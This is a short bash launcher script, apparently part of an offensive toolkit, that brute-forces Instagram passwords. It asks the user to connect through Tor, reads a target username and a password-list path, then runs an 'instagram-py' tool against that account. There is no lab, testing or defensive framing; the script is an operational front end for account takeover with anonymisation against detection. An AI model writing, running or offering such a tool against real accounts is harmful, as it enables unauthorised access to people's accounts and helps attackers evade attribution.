#!/bin/bash
CWD=$(pwd)
if [[ ${CWD} == *'TSconsole-framework' ]]; then
cd programs/socialbrute/instagram/ > /dev/null 2>&1
fi
if [[ -f "config.sh" ]]; then
bash config.sh
fi
#<<<-----colors----->>>#
S0="\033[1;30m" B0="\033[1;40m"
S1="\033[1;31m" B1="\033[1;41m"
S2="\033[1;32m" B2="\033[1;42m"
S3="\033[1;33m" B3="\033[1;43m"
S4="\033[1;34m" B4="\033[1;44m"
S5="\033[1;35m" B5="\033[1;45m"
S6="\033[1;36m" B6="\033[1;46m"
S7="\033[1;37m" B7="\033[1;47m"
R0="\033[00m"   R1="\033[1;00m"
#<---x--->#

printf "${S4}Please run 'tor' in another session${R0}\n"
printf "${S5}Run 'y' if you are connected to tor==> ${R0}"
read TORR
if [[ ${TORR} == 'Y' || ${TORR} == 'y' ]]; then
:
else
printf "${S2}[${S1}!${S2}]${S1}Since you don't have started the tor server, Exiting....${R0}\n"
exit 1
fi
echo
printf "\033[3;4;37mTSc\033[0;0;00m ${S7}Enter(${S1}target/username${S7})> ${R0}"
read USRNM
printf "\033[3;4;37mTSc\033[0;0;00m ${S7}Enter(${S1}path/password/list${S7})> ${R0}"
read PASW
cd assets
./instagram-py -u ${USRNM} -pl ${PASW}
if [[ ${CWD} == *'TSconsole-framework' ]]; then
cd ../../../ > /dev/null 2>&1
fi
